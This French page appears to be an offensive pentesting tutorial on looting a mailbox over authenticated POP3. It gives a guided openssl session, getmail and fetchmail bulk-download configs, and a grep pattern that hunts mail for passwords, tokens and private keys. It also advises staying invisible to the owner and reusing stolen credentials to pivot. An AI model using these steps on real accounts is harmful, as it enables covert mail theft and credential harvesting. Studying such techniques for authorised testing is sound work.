---
title: "Accès à la boîte aux lettres : télécharger et piller le courrier via POP3"
description: "Piloter une session POP3 authentifiée pour le butin : STAT et LIST pour mesurer la boîte aux lettres, TOP pour jeter un œil aux en-têtes sans supprimer, et RETR pour récupérer les messages complets. Vide chaque message dans une boucle guidée, cherche les secrets au grep, et utilise fetchmail ou getmail pour le téléchargement en masse, avec attention au comportement de suppression à la récupération de POP3."
keywords:
  - pop3 retr
  - pop3 top
  - mail harvesting
  - fetchmail
  - getmail
---

# Accès à la boîte aux lettres

Une fois authentifié, POP3 vous donne une liste numérotée de messages dans l'unique maildrop et trois commandes qui comptent : `STAT` et `LIST` pour le mesurer et l'énumérer, `TOP n 0` pour lire les en-têtes d'un message sans récupérer (ni supprimer) le corps, et `RETR n` pour télécharger le message complet. Il n'y a pas de modèle de dossiers ni de recherche côté serveur, la technique consiste donc simplement à « tout récupérer et chercher au grep en local ». Le butin est le même que pour toute boîte aux lettres : identifiants en clair, liens de réinitialisation et d'enrôlement, pièces jointes et correspondance du compte.

## Prérequis

Une session authentifiée ([authentification](authentication.md)), sur le port 995 ou STLS afin que le courrier ne soit pas recopié sur le chemin.

## Le piège de la suppression à la récupération

Les clients POP3 émettent classiquement `DELE` après `RETR` puis `QUIT`, ce qui supprime définitivement le courrier côté serveur. Le protocole lui-même ne supprime pas sur `RETR` ; c'est le client qui le fait. Ainsi, tant que vous n'envoyez jamais `DELE` et que vous terminez par `RSET` ou un simple `QUIT` sans avoir marqué quoi que ce soit comme supprimé, la boîte aux lettres reste intacte. Lorsque vous devez rester invisible pour le propriétaire de la boîte aux lettres, utilisez `TOP n 0` pour lire les en-têtes (et `TOP n 50` pour les premières lignes du corps) plutôt que `RETR`, puisque le simple coup d'œil ne laisse aucune marque de suppression. Ne laissez jamais un client automatisé exécuter sa récupération-suppression par défaut contre une boîte aux lettres active que vous devez préserver.

## Session guidée

```bash
openssl s_client -connect <target>:995 -quiet
USER alice
+OK
PASS Sprint2025!
+OK Logged in.
STAT
+OK 12 48210                       # 12 messages, 48210 bytes total
LIST
+OK 12 messages:
1 3312
2 10290
...
.
TOP 7 0
+OK
From: it-helpdesk@corp.local
Subject: Temporary credentials for the new portal
Date: Mon, 22 Sep 2025 09:11:04 +0000
.
RETR 7
+OK 2048 octets
...full message including body and attachments...
.
QUIT
+OK Logging out.
```

Lisez les nombres : `STAT` donne le nombre et la taille totale, `LIST` donne la taille par message pour que vous puissiez prioriser les gros (pièces jointes) ou les ignorer. `TOP 7 0` affiche les en-têtes du message 7 et zéro ligne de corps ; utilisez-le pour trier les sujets et expéditeurs sur tout le maildrop à bas coût, puis ne faites `RETR` que sur les plus prometteurs. Chaque réponse multiligne se termine par une ligne contenant un seul `.`.

## Téléchargement en masse et tri

Pour tout le maildrop, laissez un client POP3 récupérer une fois tout vers un Maildir, puis fouillez hors ligne. Forcez le maintien sur le serveur pour que rien ne soit supprimé.

```bash
# getmail: retrieve without deleting
cat > ~/.getmail/loot <<'EOF'
[retriever]
type = SimplePOP3SSLRetriever
server = <target>
port = 995
username = alice
password = Sprint2025!
[destination]
type = Maildir
path = ~/loot/alice/
[options]
delete = false
read_all = true
EOF
getmail --rcfile loot

# fetchmail equivalent (keep mail on server)
fetchmail -p POP3 --ssl -u alice --keep -m 'procmail -d %T' <target>

# mine the result
grep -rniE 'password|passwd|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH) PRIVATE KEY' ~/loot/alice/ | head
```

`delete = false` / `--keep` est l'interrupteur de sécurité : sans lui, les deux outils suppriment côté serveur après téléchargement. Pour une récupération interactive rapide sans fichier de configuration, une courte boucle sur `RETR` tubée à travers `openssl s_client` écrit chaque message sur le disque en une passe.

## Suites

Réutilisez immédiatement les identifiants et jetons récupérés contre d'autres services, extrayez les pièces jointes pour les documents et d'autres secrets, et cartographiez les contacts du compte à partir des en-têtes de message pour le prochain pivot. Comme POP3 n'a pas de notion de dossier `Sent`, si IMAP est aussi exposé sur le même compte, préférez l'[accès à la boîte aux lettres IMAP](../imap/mailbox-access.md) pour atteindre le courrier envoyé et les archives.

## Outils

- [getmail](https://github.com/getmail6/getmail6)
- [fetchmail](https://www.fetchmail.info/)

## Références

- [RFC 1939 : STAT, LIST, RETR, TOP, DELE](https://datatracker.ietf.org/doc/html/rfc1939#section-5)
- [HackTricks : pentesting POP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html)
